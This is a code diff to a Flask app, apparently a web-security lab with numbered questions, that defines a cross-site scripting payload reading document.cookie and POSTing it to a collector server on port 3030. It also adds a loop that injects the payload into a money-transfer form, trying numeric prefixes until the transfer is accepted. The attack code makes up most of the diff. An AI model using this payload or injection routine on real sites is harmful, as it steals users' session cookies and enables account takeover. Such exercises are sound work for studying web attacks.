@@ -10,6 +10,9 @@ import os
 from flask_cors import cross_origin
 
 
+xss_cookie_stealing_script = "<script>cookies = document.cookie.split(); console.log(cookies); fetch('http://127.0.0.1:3030/recieve', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({'cookies': cookies})});</script>"
+
+
 ###################################
 ## Transfer functionality for Q2 ##
 ###################################
@@ -27,9 +30,8 @@ def doneLoginPage():
 
 @app.route('/Q3', methods=['GET', 'POST'])
 def cookieGet():
-    script = "<script>cookies = document.cookie.split(); console.log(cookies); fetch('http://127.0.0.1:3030/recieve', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({'cookies': cookies})});</script>"
 
-    return render_template("q3.html", script=script)
+    return render_template("q3.html", script=xss_cookie_stealing_script)
 
 
 #########################
@@ -41,14 +43,22 @@ def Q4():
     webSession = Session()
 
     url = "http://127.0.0.1:5000/Q4"
-    testScript = ""
-    form = {
-        "reciepient": "Gustaf0",
-        "money": ""
-    }
+    magicNumber = None
 
+    #Look for string, "Can not transfer (money amount and script)"
+    for j in range(10):
+        form = {
+            "username": "Gustaf0",
+            "money": f"{j}{xss_cookie_stealing_script}"
+        }
 
-    return render_template("q4.html")
+        response = webSession.post(url, form)
+        if ("Money has been transfered!" in response.text):
+            print(j)
+            magicNumber = j
+            break
+
+    return render_template("q4.html", script=f"{magicNumber}{xss_cookie_stealing_script}")
 
 
 ###############
